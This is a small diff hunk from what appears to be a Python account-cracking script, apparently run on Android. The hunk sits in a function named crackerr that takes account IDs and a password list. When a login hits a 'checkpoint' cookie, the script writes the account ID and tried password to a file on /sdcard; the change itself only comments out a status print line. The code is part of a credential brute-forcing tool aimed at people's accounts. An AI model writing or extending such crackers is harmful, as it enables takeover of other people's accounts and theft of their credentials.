@@ -446,7 +446,7 @@ def crackerr(ids,passlist):
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\033[1;91m [sumon-CP] '+ids+' | '+pas+'')
+                #print('\033[1;91m [sumon-CP] '+cid+' | '+pas+'')
                 open('/sdcard/SUMON-FILE/CP.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
